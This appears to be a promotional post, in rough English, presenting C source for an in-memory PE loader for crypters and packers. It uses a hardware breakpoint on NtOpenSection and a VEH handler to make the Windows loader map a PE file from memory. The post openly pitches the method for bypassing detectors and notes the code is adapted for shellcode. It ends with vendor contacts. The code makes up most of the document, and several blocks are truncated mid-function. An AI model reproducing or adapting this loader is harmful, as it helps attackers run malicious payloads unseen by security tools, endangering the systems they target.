# Loader
<img align="left" src="https://injectexp.dev/assets/img/blog/blg-f1.png" width="650" height="350">
The most common techniques to this day are RunPE and LoadPE 👨‍💻
Modification for loading executable files from memory
As you know, most cryptographers and packers use various methods to unpack and run a PE file from memory. The most common techniques to this day are RunPE and LoadPE. These techniques, especially when it comes to LoadPE, in particular cases and interesting implementations can be quite effective in terms of bypassing detectors. The essence of LoadPE is to repeat the actions that the system loader performs. Our method is not to repeat these actions, but to force the loader itself to load binaries from memory. I should also note that the implementation presented in the code was borrowed from the _Indy user (for the most part), but there is more than one way to implement this method.

#
The method is based on intercepting some system calls that occur in the internal work of the system loader (LoadLibrary), at the stage when it tries to find the DLL in \KnownDLLs(32). All of the above will be implemented in C, and attached to the topic in a convenient form. The method, as already found out, should work for any of the most popular PE file formats (DLL/EXE), but with .but there are some little things that we will also tell you about.
#
What is needed to implement the technique?

We start as in a regular LoadPE, create a section, if the target image does not have any relocations, we try to make a map based on the preferred database. If there is a relocation, map to a random address (*BaseAddress = 0). We copy the headers and sections to the previously created display. We patch the locks if the image was not recorded according to its database. If we are trying to launch it .exe file, then add the IMAGE_FILE_DLL attribute to the Characteristics field of the PE file header, and, of course, add AddressOfEntryPoint in the optional header.

Let's save the section descriptor, the base address of the display, which managed to record (and relocate) the target image. Let's make an anmap of the display, because we no longer need it. We begin to hook. We put HWBP on NtOpenSection, add a VEH handler that will do all the work, call LoadLibrary with the fake DLL name passed to it in advance (preferably fake), handle exceptions, check the image name, directory name, force the loader to process and execute our PE file from memory, replacing the arguments in the stack/registers.

If we are trying to download the .exe, after all the procedures, we need to call EntryPoint, and preferably patch ImageBaseAddress in PEB with the base address at which we downloaded the .exe . Ready!

Before talking about an alternative implementation, let's briefly consider how the library is loaded when calling LoadLibrary, consider those calls that are interesting to us.

#### The loader starts searching for a file in directories through many calls to.

#### When the library file is found, NtOpenFile is called.

#### After receiving the file descriptor, a section is created via NtCreateSection, the last argument is passed to the file descriptor opened earlier.

#### The file is displayed via the tMapViewOfSection call.

#### Closing the file descriptor and section via.

<div align="center">
Implementation for x64 PE
</div>
Well, let's start with the headlines. Let's create headlines with all the internal structures we need

Also, we will add prototypes of Nt functions and a macro for displaying debug messages. And, of course, the most important thing is the LL_WRAPPER structure, where all the information necessary for intercepting and downloading PE will be stored.

Done with the structures, let's move on to the code. Let's write two functions for copying an image to memory/its relocations. The LdrCreateImageSection function. Creates a section and, depending on the availability of locks, maps either to the database or to a random address. Calls LdrConvertFileToImage to copy the image and patch the locks.

```
PVOID LdrCreateImageSection(PLL_WRAPPER lwe, PVOID ImageBase) {

    LARGE_INTEGER     sec_size;
    OBJECT_ATTRIBUTES ObjAttr;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_NT_HEADERS nt = RVA2VA(PIMAGE_NT_HEADERS, ImageBase, dos->e_lfanew);
    DWORD             size, rva;
    ULONG_PTR         NewImageBase;
    HANDLE            LHandle = NULL;
    SIZE_T            ViewSize;
    PVOID             MapAddress = NULL;
    NTSTATUS          STATUS;
    BOOL              has_reloc;



    lwe->entrypoint = nt->OptionalHeader.AddressOfEntryPoint; // save Ep in LL_WRAPPER struct

    if(!(nt->FileHeader.Characteristics & IMAGE_FILE_DLL)) // check if PE is DLL
      lwe->is_dll = FALSE;
    else
      lwe->is_dll = TRUE;
   

    sec_size.QuadPart = nt->OptionalHeader.SizeOfImage;
    ViewSize = nt->OptionalHeader.SizeOfImage;

    // check if the binary has relocation information
    size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    has_reloc = size == 0? FALSE : TRUE;
    if (!has_reloc)
    {
      DPRINT("No relocation information present, setting the base to: 0x%p", (PVOID)nt->OptionalHeader.ImageBase);
      MapAddress = (PVOID)nt->OptionalHeader.ImageBase;
    }


    InitializeObjectAttributes(&ObjAttr, 0, 0, 0, 0);

    STATUS = lwe->pZwCreateSection(&LHandle, SECTION_ALL_ACCESS, &ObjAttr, &sec_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
    if(!NT_SUCCESS(STATUS)){
        DPRINT("Unable to create section. NSTATUS: %lu", STATUS);
        return NULL;
    }

    STATUS = lwe->pZwMapViewOfSection(LHandle, NtCurrentProcess(), &MapAddress, 0, 0, NULL, &ViewSize, ViewShare, NULL, PAGE_READWRITE);
    if(!NT_SUCCESS(STATUS) && !has_reloc) {
        DPRINT("Unable to map view of section on preferred base. Trying to map at random base. NSTATUS: %lu", STATUS); // relevant only for x64 binaries
        MapAddress = NULL;
        STATUS = lwe->pZwMapViewOfSection(LHandle, NtCurrentProcess(), &MapAddress, 0, 0, NULL, &ViewSize, ViewShare, NULL, PAGE_READWRITE);
        if(!NT_SUCCESS(STATUS)) {
          DPRINT("Fuck it. NTSTATUS: %lu", STATUS);
          return NULL;
        }
    }

    LdrConvertFileToImage(lwe, ImageBase, MapAddress, has_reloc);
   
    STATUS = lwe->pZwUnmapViewOfSection(NtCurrentProcess(), MapAddress);
    if(!NT_SUCCESS(STATUS)) {
        DPRINT("Unable to Unmap view of section. NSTATUS: %lu", STATUS);
        return NULL;
    }
   
    DPRINT("Created section handle: %p", LHandle);

    lwe->hSection = LHandle; // save section handle

    lwe->DllBase = MapAddress; // save base address

    return MapAddress;
}
```

The LdrConvertFileToImage function copies the image to memory, re-locates, and, if necessary, googles the EP and changes the characteristics in the file header

```
FileHeader.NumberOfSections; i++)
    {
      PBYTE dest = (PBYTE)MapAddress + sh[i].VirtualAddress;
      PBYTE source = (PBYTE)ImageBase + sh[i].PointerToRawData;

      if (sh[i].SizeOfRawData == 0)
        DPRINT("Section is empty of data, but may contain uninitialized data.");
     
      // Copy the section data
      mem_copy(dest,
          source,
          sh[i].SizeOfRawData);
     
      // Update the actual address of the section
      sh[i].Misc.PhysicalAddress = (DWORD)*dest;

      DPRINT("Copied section name: %s", sh[i].Name);
      DPRINT("Copied section source offset: 0x%X", sh[i].VirtualAddress);
      DPRINT("Copied section dest offset: 0x%X", sh[i].PointerToRawData);
      DPRINT("Copied section absolute address: 0x%lX", sh[i].Misc.PhysicalAddress);
      DPRINT("Copied section size: 0x%lX", sh[i].SizeOfRawData);
    }

    DPRINT("Sections copied.");

    if(!lwe->is_dll) {
        DPRINT("File is exe, changing characteristics in FileHeader and nulling EP.");
        DWORD null = 0;
        ntnew->FileHeader.Characteristics = ntnew->FileHeader.Characteristics | IMAGE_FILE_DLL;
        mem_copy(&ntnew->OptionalHeader.AddressOfEntryPoint, &null, sizeof(DWORD));
    }

    ntnew->OptionalHeader.ImageBase = (ULONG_PTR)MapAddress;

    ofs  = (PBYTE)MapAddress - nt->OptionalHeader.ImageBase;
    //relocs
    if (ofs != 0 && has_reloc)
    {
      DPRINT("Applying Relocations");
     
      rva  = ntnew->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
      ibr = RVA2VA(PIMAGE_BASE_RELOCATION, MapAddress, rva);
     
      while ((PBYTE)ibr < ((PBYTE)MapAddress + rva + size) && ibr->SizeOfBlock != 0) {
        list = (PIMAGE_RELOC)(ibr + 1);
 
        while ((PBYTE)list != (PBYTE)ibr + ibr->SizeOfBlock) {
          // check that the RVA is within the boundaries of the PE
          if (ibr->VirtualAddress + list->offset < ntnew->OptionalHeader.SizeOfImage) {
            PULONG_PTR address = (PULONG_PTR)((PBYTE)MapAddress + ibr->VirtualAddress + list->offset);
            if (list->type == IMAGE_REL_BASED_DIR64) {
              *address += (ULONG_PTR)ofs;
            } else if (list->type == IMAGE_REL_BASED_HIGHLOW) {
              *address += (DWORD)(ULONG_PTR)ofs;
            } else if (list->type == IMAGE_REL_BASED_HIGH) {
              *address += HIWORD(ofs);
            } else if (list->type == IMAGE_REL_BASED_LOW) {
              *address += LOWORD(ofs);
            } else if (list->type != IMAGE_REL_BASED_ABSOLUTE) {
              DPRINT("ERROR: Unrecognized Relocation type %08lx.", list->type);
              return false;
            }
          }
          list++;
        }
        ibr = (PIMAGE_BASE_RELOCATION)list;
      }
    }

    return true;
}
```
A small function, rather for convenience. Prepares the registers before installing the (next) HWBP, you can transfer the functionality from it to the main VEH handler (you will need to transfer it for x32... ??)

```
<< 0;
        context->Dr3 = (ULONG_PTR)lwe; // we keep a pointer to the structure in Dr3, because there is nothing important there
        context->Dr0 = func_addr;

        lwe->pZwContinue(context, FALSE);
        lwe->pRtlFreeHeap(NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap, 0, context);
    }
    else{
   
        context->Dr7 = 1 << 0;
        context->Dr3 = (ULONG_PTR)lwe;
        context->Dr0 = func_addr;
        lwe->pZwContinue(context, FALSE);

    }

  return true;
}
```
The most cumbersome function in the source code. The VEH handler. Performs all the basic work of intercepting the loader. Those who are familiar with VEH should understand what is going on here.

```
#define RET_INSTRUCTION 0xC3 // 0xC2 for wow64 ntdll

LONG veh (PEXCEPTION_POINTERS ExceptionInfo) {

    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) { //HWBP

        PLL_WRAPPER lwe = (PLL_WRAPPER)ExceptionInfo->ContextRecord->Dr3;

        if(lwe->status == ZwOpenSection) {
            DPRINT("lwe->status == ZwOpenSection");

            WCHAR              NameBuffer[MAX_PATH*2];
            UNICODE_STRING     ObjectName;
            ULONG              ReturnLength = 0;
            PUNICODE_STRING    TempName;
            POBJECT_ATTRIBUTES ObjectAttr = (POBJECT_ATTRIBUTES)ExceptionInfo->ContextRecord->R8; //3rd arg
            DPRINT("ObjectAttr->ObjectName: %ws", ObjectAttr->ObjectName->Buffer);
            DPRINT("ObjectAttr->RootDirectory: %p", ObjectAttr->RootDirectory);

            TempName = ObjectAttr->ObjectName; // save tempname
           
            if(lwe->pRtlCompareUnicodeString(TempName, &lwe->DllName, TRUE))
              lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);

            ObjectName.Buffer = NameBuffer; // init ObjectName
            ObjectName.Length = MAX_PATH*2;
            ObjectName.MaximumLength = MAX_PATH*2;
           
            if(lwe->pZwQueryObject(ObjectAttr->RootDirectory, ObjectNameInformation, &ObjectName, MAX_PATH*2 + sizeof(UNICODE_STRING), NULL) != 0x00) {
              lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }
            DPRINT("ObjectName.Buffer: %ws", ObjectName.Buffer);
            if(lwe->pRtlCompareUnicodeString(&ObjectName, &lwe->Directory, TRUE)) { //check if it's knowndlls
              if(lwe->pRtlCompareUnicodeString(&ObjectName, &lwe->Directory32, TRUE)) {
                lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
              }
            }

            ULONG_PTR* hSection = (ULONG_PTR*)ExceptionInfo->ContextRecord->Rcx; // ptr to section handle
     
            *hSection = (ULONG_PTR)lwe->hSection; // change
            DPRINT("Changed hSection to: %llu", *hSection);

            BYTE ret = 0;
            PBYTE func_base = (PBYTE)ExceptionInfo->ContextRecord->Rip;
            while(*func_base != RET_INSTRUCTION){
              func_base++;
              ret++;
            } //find ret to skip ZwOpenSection

            ExceptionInfo->ContextRecord->Rax = 0;
            ExceptionInfo->ContextRecord->Rip += ret;

            lwe->status = ZwMapViewOfSection;
            prepare((ULONG_PTR)lwe->pZwMapViewOfSection, ExceptionInfo->ContextRecord, lwe);

            lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
         
        }

       
        if(lwe->status == ZwMapViewOfSection) {

            DPRINT("lwe->status == ZwMapViewOfSection");

            ULONG_PTR  hSection = (ULONG_PTR)ExceptionInfo->ContextRecord->Rcx;
            HANDLE     hProcess = (HANDLE)ExceptionInfo->ContextRecord->Rdx;
            ULONG_PTR *BaseAddress = (ULONG_PTR *)ExceptionInfo->ContextRecord->R8;

            ULONG_PTR* RSP = (ULONG_PTR*)ExceptionInfo->ContextRecord->Rsp;

            ULONG     *AllocationType = (ULONG*)((char*)RSP + 9 * 8);
            ULONG     *Protection = (ULONG*)((char*)RSP + 10 * 8);

            #ifdef DEBUG

            ULONG_PTR ZeroBits = (ULONG_PTR)ExceptionInfo->ContextRecord->R9;
            SIZE_T *CommitSize = (SIZE_T*)((char*)RSP + 5 * 8);
            PLARGE_INTEGER *SectionOffset = (PLARGE_INTEGER*)((char*)RSP + 6 * 8);
            PSIZE_T* size = (SIZE_T**)((char*)RSP + 7 * 8);
            ULONG *InheritDisposition = (ULONG*)((char*)RSP + 8 * 8);
            #endif
           
            if(hSection != (ULONG_PTR)lwe->hSection) {
                DPRINT("Section handle is not equal to pre-created one");
                DPRINT("Section handle: %p", hSection);
                lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }
            if(hProcess != NtCurrentProcess()) {
              DPRINT("Process handle is not equal to current process handle (pseudo)");
              DPRINT("Process handle: %p", hProcess);
              lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }

            if(hSection == (ULONG_PTR)lwe->hSection && hProcess == NtCurrentProcess()) {
                DPRINT("Handle of section is equal to pre-created section handle, and the process handle is ours.");
                *AllocationType = 0; // Cause there will be always SEC_FILE, we don't need that
                *Protection = PAGE_EXECUTE_READWRITE; // :(. u can write handler to set proper protections inside veh handler, but there's rwx map
                *BaseAddress = (ULONG_PTR)lwe->DllBase;
               
                DPRINT("ZwMapViewOfSection: SECTION HANDLE: %p, PROCESS HANDLE: %p, BASE ADDRESS: %p, ZeroBits: %llu, CommitSize: %llu, SectionOffset: %p, VIEW SIZE: %llu, InheritDisposition: %lu, AllocationType: %lu, Win32Protect: %lu", \
                hSection, hProcess, *BaseAddress, ZeroBits, *CommitSize, *SectionOffset, **size, *InheritDisposition, *AllocationType, *Protection);

               
                lwe->status = ZwClose;
                prepare(lwe->pZwClose, ExceptionInfo->ContextRecord, lwe);
                lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }
        }
       
        if(lwe->status == ZwClose) {
            DPRINT("lwe->status == ZwClose");
            ULONG_PTR handle = (ULONG_PTR)ExceptionInfo->ContextRecord->Rcx;
           
            if(handle == (ULONG_PTR)lwe->hSection) {
                DPRINT("Handle of section is equal to pre-created section handle!");
                DPRINT("ZwClose: section handle: %llu", handle);
                lwe->status = End;
                lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }
            else {
                DPRINT("Handle of section is not equal to pre-created section handle.");
                DPRINT("ZwClose: section handle: %llu", handle);
                ExceptionInfo->ContextRecord->EFlags |= 0x10000;
                lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }
           

        }
        if(lwe->status == End) {
            DPRINT("lwe->status == End");
            ExceptionInfo->ContextRecord->Dr0 = 0;
            ExceptionInfo->ContextRecord->Dr1 = 0;
            ExceptionInfo->ContextRecord->Dr2 = 0;
            ExceptionInfo->ContextRecord->Dr3 = 0;
            ExceptionInfo->ContextRecord->Dr6 = 0;
            ExceptionInfo->ContextRecord->Dr7 = 0;
            ExceptionInfo->ContextRecord->EFlags |= 0x10000;
            lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
        }

        lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
    }
```

Actually, the entry point. The only place where any imports and strings appear, all other functions are adapted for use in shellcodes. This is where the LL_WRAPPER structure is initialized, HWBP is installed, VEH handlers are added, etc.

```
int main(void) {

    HMODULE        ntdll = GetModuleHandleA("ntdll.dll");

    HANDLE         hSection = NULL, hModule = NULL;
    LL_WRAPPER     lwe;
    PVOID          DllBase;
    PVOID          entrypoint;
    //init apis
    lwe.pRtlCompareUnicodeString = (TD_RtlCompareUnicodeString) GetProcAddress(ntdll, "RtlCompareUnicodeString");
    lwe.pRtlCreateUnicodeString  = (TD_RtlCreateUnicodeString)  GetProcAddress(ntdll, "RtlCreateUnicodeString");
    lwe.pRtlAllocateHeap         = (TD_RtlAllocateHeap)         GetProcAddress(ntdll, "RtlAllocateHeap");
    lwe.pZwGetContextThread      = (TD_NtGetContextThread)      GetProcAddress(ntdll, "NtGetContextThread");
    lwe.pRtlFreeHeap             = (TD_RtlFreeHeap)             GetProcAddress(ntdll, "RtlFreeHeap");
    lwe.pZwContinue              = (TD_NtContinue)              GetProcAddress(ntdll, "NtContinue");
    lwe.pZwCreateSection         = (TD_NtCreateSection)         GetProcAddress(ntdll, "NtCreateSection");
    lwe.pZwUnmapViewOfSection    = (TD_NtUnmapViewOfSection)    GetProcAddress(ntdll, "NtUnmapViewOfSection");
    lwe.pZwOpenSection           = (ULONG_PTR)                  GetProcAddress(ntdll, "NtOpenSection");
    lwe.pZwMapViewOfSection      = (TD_NtMapViewOfSection)      GetProcAddress(ntdll, "NtMapViewOfSection");
    lwe.pZwClose                 = (ULONG_PTR)                  GetProcAddress(ntdll, "NtClose");
    lwe.pZwQueryObject           = (TD_NtQueryObject)           GetProcAddress(ntdll, "NtQueryObject");
    //init required strings
    lwe.pRtlCreateUnicodeString(&lwe.Directory,   L"\\KnownDlls");
    lwe.pRtlCreateUnicodeString(&lwe.Directory32, L"\\KnownDlls32");
    lwe.pRtlCreateUnicodeString(&lwe.DllName, DLL_NAME);

    //create image section
    if(!LdrCreateImageSection(&lwe, rawData)){
      DPRINT("Unable to create Image section from raw PE. Something wrong...");
      return -1;
    }

    lwe.status = ZwOpenSection;
    // add veh handler
    PVOID hVeh = AddVectoredExceptionHandler(1, veh);
    // set hwbp
    prepare(lwe.pZwOpenSection, NULL, &lwe);
    //lesgoo
    hModule = LoadLibraryW(DLL_NAME);

    RemoveVectoredExceptionHandler(hVeh);

    DPRINT("Module base: %p", hModule);

    //fix if it's .exe
    if(!lwe.is_dll) {
      DPRINT("Your file is .exe, so it's required to update ImageBaseAddress in PEB with loaded .exe");
      NtCurrentTeb()->ProcessEnvironmentBlock->ImageBaseAddress = hModule;
      entrypoint = RVA2VA(PVOID, hModule, lwe.entrypoint);
      DPRINT("Executing .exe entrypoint: %p", entrypoint);
      ((void(*)())entrypoint)();
    }

    return 0;

}
```
<img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">
Contacts:
injectexp.dev / 
pro.injectexp.dev / 
Telegram: @DevSecAS [support]
Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72
